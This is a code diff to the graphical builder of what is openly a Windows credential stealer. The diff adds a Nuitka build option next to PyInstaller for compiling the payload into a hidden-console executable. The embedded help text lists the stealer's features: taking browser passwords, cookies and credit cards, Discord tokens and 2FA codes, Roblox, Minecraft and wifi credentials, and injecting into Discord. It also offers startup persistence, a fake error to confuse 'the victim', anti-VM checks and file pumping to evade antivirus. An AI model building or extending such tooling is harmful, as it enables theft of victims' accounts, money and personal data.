@@ -14,6 +14,7 @@ import customtkinter
 import pyuac
 import requests
 from PIL import Image
+import sys
 
 logging.basicConfig(
     level=logging.DEBUG,
@@ -209,7 +210,7 @@ class App(customtkinter.CTk):
                                                 fg_color="#5d11c3", hover_color="#5057eb")
         self.clipboard.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
 
-        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", ".py"],
+        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["nuitka", "pyinstaller", ".py"],
                                                     font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                     fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.multi_commands)
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
@@ -246,7 +247,7 @@ class App(customtkinter.CTk):
         self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
         self.docsbox.insert(
             "0.0",
-            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nClipboard:\nRetrieves the last thing they copied onto their clipboard.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Smaller file size, basically fully undetectable\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")
+            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nClipboard:\nRetrieves the last thing they copied onto their clipboard.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nNuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.")
 
         self.select_frame_by_name("home")
 
@@ -309,7 +310,7 @@ class App(customtkinter.CTk):
             self.pump_size.configure(state="disabled")
 
     def multi_commands(self, value):
-        if value == "pyinstaller":
+        if value in ["nuitka", "pyinstaller"]:
             self.check_icon()
         elif value == ".py":
             self.check_icon()
@@ -324,7 +325,7 @@ class App(customtkinter.CTk):
             self.browser.select()
 
     def check_icon(self):
-        if self.fileopts.get() == "pyinstaller":
+        if self.fileopts.get() in ["pyinstaller", "nuitka"]:
             self.icon.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
@@ -396,12 +397,12 @@ class App(customtkinter.CTk):
 
     def reset_build_button(self):
         self.build.configure(width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
-                             fg_color="#5d11c3", hover_color="#5057eb")
+                             fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
 
     def building_button_thread(self, thread):
         while thread.is_alive():
             for i in [".", "..", "..."]:
-                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
+                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb", command=None)
                 time.sleep(0.3)
                 self.update()
 
@@ -460,8 +461,8 @@ class App(customtkinter.CTk):
                 exeicon = self.iconpath
 
             if filetype == "pyinstaller":
-                subprocess.run(["python", "./tools/upx.py"])
-                subprocess.run(["python", "-m", "PyInstaller",
+                subprocess.run(["./.venv/Scripts/python", "./tools/upx.py"])
+                subprocess.run(["./.venv/Scripts/python", "-m", "PyInstaller",
                                 "--onefile", "--clean", "--noconsole",
                                 "--upx-dir=./tools", "--distpath=./",
                                 "--hidden-import", "base64",
@@ -482,9 +483,49 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "Cryptodome.Cipher",
                                 "--hidden-import", "Cryptodome.Cipher.AES",
                                 "--hidden-import", "win32crypt",
-                                "--icon", exeicon, f"./{filename}.py"])
-    
+                                "--icon", exeicon, f"./{filename}.py"]
+                               )
+
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
+
+            if filetype == "nuitka":
+                if sys.version_info[:2] > (3, 11):
+                    print("Nuitka does not support Python 3.12")
+                    logging.error("Nuitka does not support Python 3.12")
+                    return
+                else:
+                    try:
+                        if exeicon != "NONE":
+                            # If exeicon is not None, set the icon parameter
+                            subprocess.run([
+                                "./.venv/Scripts/python", "-m", "nuitka",
+                                "--onefile", "--standalone", "--remove-output",
+                                "--show-progress", "--prefer-source-code",
+                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                "--include-module=sqlite3", "--include-module=psutil",
+                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--assume-yes-for-downloads", "--windows-disable-console",
+                                f"--windows-icon-from-ico={exeicon}",
+                                f"./{filename}.py"
+                            ])
+                        else:
+                            # If exeicon is None, run without setting the icon parameter
+                            subprocess.run([
+                                "./.venv/Scripts/python", "-m", "nuitka",
+                                "--onefile", "--standalone", "--remove-output",
+                                "--show-progress", "--prefer-source-code",
+                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                "--include-module=sqlite3", "--include-module=psutil",
+                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--assume-yes-for-downloads", "--windows-disable-console",
+                                f"./{filename}.py"
+                            ])
+                        logging.info(f"Successfully compiled {filename}.exe with nuitka")
+                    except Exception as e:
+                        logging.error(f"Error with compiling file: {e}")
+
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
 
@@ -541,6 +582,20 @@ class App(customtkinter.CTk):
                 self.write_and_obfuscate(filename)
 
                 thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
+                thread.start()
+                self.building_button_thread(thread)
+
+                if self.pump.get() == 1:
+                    self.file_pumper(filename, "exe", self.get_mb())
+
+                self.built_file()
+                self.builder_frame.after(3000, self.reset_build_button)
+                self.cleanup_files(filename)
+
+            elif self.get_filetype() == "nuitka":
+                self.write_and_obfuscate(filename)
+
+                thread = threading.Thread(target=self.compile_file, args=(filename, "nuitka",))
                 thread.start()
                 self.building_button_thread(thread)
 
